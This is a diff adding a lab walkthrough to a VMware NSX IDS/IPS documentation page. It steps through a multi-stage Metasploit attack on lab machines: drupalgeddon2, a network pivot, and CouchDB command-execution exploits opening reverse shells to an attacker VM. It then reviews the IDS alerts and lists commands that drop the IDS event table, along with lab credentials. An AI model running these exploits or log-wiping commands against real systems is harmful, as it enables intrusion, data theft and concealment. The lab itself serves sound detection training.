@@ -165,7 +165,129 @@
 
                 <div id="content" class="content">
                     <main>
-                        <h1 id="perform-multi-stage-attack-leveraging-software-vulnerabilities"><a class="header" href="#perform-multi-stage-attack-leveraging-software-vulnerabilities">Perform Multi-Stage Attack Leveraging Software Vulnerabilities</a></h1>
+                        <h1 id="22-perform-multi-stage-attack-leveraging-software-vulnerabilities"><a class="header" href="#22-perform-multi-stage-attack-leveraging-software-vulnerabilities">2.2 Perform Multi-Stage Attack Leveraging Software Vulnerabilities</a></h1>
+<h2 id="1-overview"><a class="header" href="#1-overview">1. Overview</a></h2>
+<p><img src="https://media.screensteps.com/image_assets/assets/004/048/820/medium/59d95012-0586-4b14-a897-154924e1d696.png" alt="" /></p>
+<p>In this section, we will impersonate a fictitious attacker aiming to exfiltrate critical data stored in the production database residing in the internal zone. The production database is not directly accessible from the attacker's workstation. For this reason, we will have to perform a multi-stage attack where we will initially exploit less critical components to find a path to the &quot;crown jewels&quot; of our company. When the attack is complete, we will look at the IDS events to see if they reveal information about the attacker's behavior.</p>
+<p>The initial step will be to perform an attack on the vulnerable development drupal server sitting in the DMZ. The system is not patched and exposes a known vulnerability. The attacker will exploit it to create a reverse shell session to its workstation. Via that session, the attacker can perform additional discovery and attack activity.</p>
+<p><img src="https://media.screensteps.com/image_assets/assets/004/048/824/medium/e2a72552-4b54-41d4-843d-391de4c0ce4b.png" alt="" /></p>
+<p>Once the attacker controls the drupal development server in the DMZ, she will start a port scan via NMAP to figure out what other systems are reachable from there. Because of the edge firewall segmentation, we implemented the production database is not discovered. The attacker can recognize the development database's presence in the internal zone, though, and might decide to attack it to pivot to a different network.</p>
+<p><img src="https://media.screensteps.com/image_assets/assets/004/048/818/medium/2850f7e8-4790-43ab-a3ad-c2e80411cc76.png" alt="" /></p>
+<p>The attacker, leveraging a vulnerability in the development database server, can establish an additional reverse shell session. At this point, the attacker is in full control of two systems in our environment.</p>
+<p><img src="https://media.screensteps.com/image_assets/assets/004/048/822/medium/8b608cf6-be6e-48f8-863a-a21a58c220a2.png" alt="" /></p>
+<p>The last stage of the attack will consist of taking control of the production database server. The production database runs the same code as the development one, so the attacker can exploit it via the same mechanisms. Because the development and production databases sit in the same network, the attacker can use the reverse shell session to the development server to initiate an attack on the production database. Once that is completed, the attacker can exfiltrate data from the production database via the established reverse shell session.</p>
+<h2 id="2-exploit-vulnerability-on-the-drupal-server-in-the-dmz"><a class="header" href="#2-exploit-vulnerability-on-the-drupal-server-in-the-dmz">2. Exploit vulnerability on the Drupal Server in the DMZ</a></h2>
+<p><img src="https://media.screensteps.com/image_assets/assets/003/966/232/original/ab9dd551-628d-4f8e-ae7d-2c5b95e887b9.png" alt="" /></p>
+<p>SSH to the <strong>attacker-01a</strong> VM. credentials are vmware/VMware1!</p>
+<p><img src="https://media.screensteps.com/image_assets/assets/003/966/238/original/19fa46ff-b180-4106-9af3-483f438458b5.png" alt="" /></p>
+<p>Start the Metasploit console via the command <code>sudo msfconsole</code></p>
+<p><img src="https://media.screensteps.com/image_assets/assets/003/966/236/original/e1303e1e-64a6-4b56-8131-e82f097c887c.png" alt="" /></p>
+<p>Select the dupalgeddon2 exploit module via the command <code>use exploit/unix/webapp/drupal_drupalgeddon2</code></p>
+<p><img src="https://media.screensteps.com/image_assets/assets/004/125/878/original/0dfeda08-3b14-4629-8cce-ae2a63d181e3.png" alt="" /></p>
+<ol>
+<li>Set the IP of the targeted victim, the drupal-dev VM in the DMZ, via the command  <code>set RHOST 172.16.70.11</code></li>
+<li>Set the port where the vulnerable drupal service is running on the victim VM via the command <code>set RPORT 8080</code></li>
+</ol>
+<p><img src="https://media.screensteps.com/image_assets/assets/004/125/812/original/ef235692-e1ab-4ecb-a815-19dcb067e3fa.png" alt="" /></p>
+<p>Start the exploit via the command <code>exploit</code></p>
+<p><img src="https://media.screensteps.com/image_assets/assets/003/966/240/medium/c677b04b-133d-48ce-8c51-c39b851ac822.png" alt="" /></p>
+<ol>
+<li>You can use <code>sysinfo</code> or other meterpreter commands to retrive information about the exploited system</li>
+<li>Send the session to the background via the <code>background</code> command</li>
+</ol>
+<h2 id="3-pivot-to-internal-network"><a class="header" href="#3-pivot-to-internal-network">3. Pivot to Internal Network</a></h2>
+<p><img src="https://media.screensteps.com/image_assets/assets/003/966/230/original/da0c7934-0d4f-44f0-80f4-2056fefc6cbf.png" alt="" /></p>
+<p>Install a static route to the internal network subnet via the session 1 we put in the background via the command  <code>route add 172.16.60.0/24 1</code>.  The attacker VM will use the established session to the vulnerable system in the DMZ to reach the internal network.</p>
+<p><img src="https://media.screensteps.com/image_assets/assets/004/076/105/medium/5bb439db-a973-4e28-99e3-22b17f5124cb.png" alt="" /></p>
+<ol>
+<li>Initialize the tcp scanner module via the command <code>use auxiliary/scanner/portscan/tcp</code></li>
+<li>Set the range of IP to be scanned via the command <code>set RHOSTS 172.16.60.0/28</code></li>
+<li>Set the TCP port t scan with the command <code>set PORTS 5984</code></li>
+<li>Run the scan via the command <code>run</code></li>
+<li>Note that only the dev couchdb is reachable. The production couchdb with IP 172.16.60.12 is not reachable from the DMZ network</li>
+</ol>
+<p><img src="https://media.screensteps.com/image_assets/assets/003/966/456/medium/90f815ce-c781-4436-85ab-8b2218f3086d.png" alt="" /></p>
+<ol>
+<li>prepare the use of the apache_couchdb exploit via the command <code>use exploit/linux/http/apache_couchdb_cmd_exec</code></li>
+<li>Set the victim ip with the command <code>set RHOST 172.16.60.11</code></li>
+<li>Set the listening IP (Attacker VM IP) for the reverse shell session  <code>set LHOST 192.168.100.5</code></li>
+<li>Set  the listening port for the reverse shell session <code>set LPORT 4445</code></li>
+</ol>
+<p><img src="https://media.screensteps.com/image_assets/assets/003/966/460/medium/b59f1c30-a275-4c2c-b6fa-18562b5c7569.png" alt="" /></p>
+<ol>
+<li>Run the exploit via the command <code>exploit</code></li>
+<li>Type background to send the session to the <code>background</code></li>
+<li>Confirm by typing <strong>y</strong></li>
+</ol>
+<h2 id="4-attack-the-production-database"><a class="header" href="#4-attack-the-production-database">4. Attack the production Database</a></h2>
+<p><img src="https://media.screensteps.com/image_assets/assets/004/125/814/medium/9c39ae54-efcc-4fc9-936d-be0034bfa575.png" alt="" /></p>
+<p>List the current sessions via the command <code>sessions -l</code></p>
+<p><img src="https://media.screensteps.com/image_assets/assets/003/966/458/medium/71d56cb8-415f-4f23-9713-6015dc576c08.png" alt="" /></p>
+<ol>
+<li>Use the shell_to_meterpreter module to upgrade the reverse shell session to couchdb-dev via the command <code>use multi/manage/shell_to_meterpreter</code> . We need it to route traffic to the production DB via that session</li>
+<li>Set the local port for the new upgraed session via the command <code>set LPORT 8081</code></li>
+<li>Set the session to upgrade via the command  <code>set session 2</code></li>
+<li>Run the exploit via the command <code>exploit</code></li>
+</ol>
+<p><img src="https://media.screensteps.com/image_assets/assets/004/125/816/medium/79a731cb-5945-43c6-a283-6821220963b0.png" alt="" /></p>
+<p>Running the command <code>sessions -l</code> , you can now see an additional metepreter session between the dev couchdb and the attacker VM.</p>
+<p><img src="https://media.screensteps.com/image_assets/assets/004/076/955/original/00c1b3e9-7fa9-4d14-a694-e49f70812b2b.png" alt="" /></p>
+<p>Instruct metasploit to use the new session (3) to reach the production database of IP 172.16.60.12. Use the command  <code>route add 172.16.60.12/32 3</code></p>
+<p><img src="https://media.screensteps.com/image_assets/assets/003/966/448/medium/d9351a71-3b1f-466a-9386-9083a94441f2.png" alt="" /></p>
+<ol>
+<li>prepare the use of the apache_couchdb exploit via the command <code>use exploit/linux/http/apache_couchdb_cmd_exec</code></li>
+<li>Set the victim ip with the command <code>set RHOST 172.16.60.12</code></li>
+<li>Set the listening IP (Attacker VM IP) for the reverse shell session  <code>set LHOST 192.168.100.5</code></li>
+<li>Set  the listening port for the reverse shell session <code>set LPORT 4446</code></li>
+<li>Run the exploit via the command <code>exploit</code></li>
+<li>Type background to send the session to the <code>background</code></li>
+<li>Confirm by typing <strong>y</strong></li>
+</ol>
+<p><img src="https://media.screensteps.com/image_assets/assets/004/125/818/medium/bfec8079-6c4b-4f35-85d5-652591cf7a20.png" alt="" /></p>
+<p>Via the command <code>sessions -l</code> , you can see that we now have a reverse shell open to the production database server.</p>
+<h2 id="5-visualize-events-in-the-nsx-ids"><a class="header" href="#5-visualize-events-in-the-nsx-ids">5. Visualize Events in the NSX IDS</a></h2>
+<p><img src="https://media.screensteps.com/image_assets/assets/004/079/149/medium/5716f57e-2fff-44a4-9305-e7584404e13c.png" alt="" /></p>
+<ol>
+<li>Navigate to the <strong>EVENTS</strong> tab, in the Distributed IDS/IPS section</li>
+<li>You should see one critical and 3 high severity events.</li>
+</ol>
+<p><img src="https://media.screensteps.com/image_assets/assets/004/125/820/medium/3a43bfcc-da81-4923-aacb-e97a9fcc8590.png" alt="" /></p>
+<ol>
+<li>Expand the event with &quot;Product Affected&quot; <strong>drupal_server</strong></li>
+<li>Note the attacker IP</li>
+<li>Note the IP of the drupal-dev VM in the DMZ</li>
+<li>Note direction of the attack and traffic flow</li>
+</ol>
+<p><img src="https://media.screensteps.com/image_assets/assets/004/125/822/medium/f30d8962-89eb-4c4f-b966-fed0dac8a3f2.png" alt="" /></p>
+<ol>
+<li>Identify the event related to the <strong>apache_couchdb</strong></li>
+<li>Click on the counter for the VMs Affected, <strong>3</strong></li>
+</ol>
+<p><img src="https://media.screensteps.com/image_assets/assets/004/079/137/original/37b33b5e-6d69-4305-b578-38da238586e0.png" alt="" /></p>
+<ol>
+<li>Note that all the 3 VMs are considered involved in the attack</li>
+<li>Click <strong>CLOSE</strong></li>
+</ol>
+<p><img src="https://media.screensteps.com/image_assets/assets/004/079/141/medium/1391b59b-9c45-401d-809d-f529184135d8.png" alt="" /></p>
+<ol>
+<li>Expand the attack</li>
+<li>Click on the <strong>Purple bar</strong></li>
+</ol>
+<p><img src="https://media.screensteps.com/image_assets/assets/004/125/824/medium/df853199-aca5-48c4-9c7c-685b0f9bc501.png" alt="" /></p>
+<ol>
+<li>Note the details about the attack</li>
+<li>Click <strong>CLOSE</strong></li>
+</ol>
+<blockquote>
+<p>If you want to try the lab again, you can clear the IPS events via this procedure:</p>
+<p>SSH to NSX manager and log in as root (VMware1!VMware1!)</p>
+<p>run this commands:</p>
+<p><code>service idps-reporting-service stop</code></p>
+<p><code>java -cp /usr/share/corfu/lib/corfudb-tools-3.1.20201022192550.7817.1-shaded.jar org.corfudb.browser.CorfuStoreBrowserMain --host=192.168.110.15 --port=9040 --tlsEnabled=true --keystore=/config/cluster-manager/corfu/private/keystore.jks --ks_password=/config/cluster-manager/corfu/private/keystore.password --truststore=/config/cluster-manager/corfu/public/truststore.jks --truststore_password=/config/cluster-manager/corfu/public/truststore.password --namespace=security_data_service --tablename=ids_event_data --operation=dropTable --diskPath=/tmp</code></p>
+<p><code>curl -X PUT -H &quot;Content-Type: application/json&quot; &quot;localhost:9200/security_data_service_metadata/_doc/security_data_service?pretty&quot; -d' {&quot;clusterId&quot; : &quot;-1&quot;}'</code></p>
+<p><code>service idps-reporting-service start</code></p>
+<p>You will need to refresh the event tab a few times.</p>
+</blockquote>
 
                     </main>
 
@@ -204,21 +326,6 @@
 
         </div>
 
-        
-        <!-- Livereload script (if served using the cli tool) -->
-        <script type="text/javascript">
-            var socket = new WebSocket("ws://localhost:3000/__livereload");
-            socket.onmessage = function (event) {
-                if (event.data === "reload") {
-                    socket.close();
-                    location.reload();
-                }
-            };
-
-            window.onbeforeunload = function() {
-                socket.close();
-            }
-        </script>
         
 
         
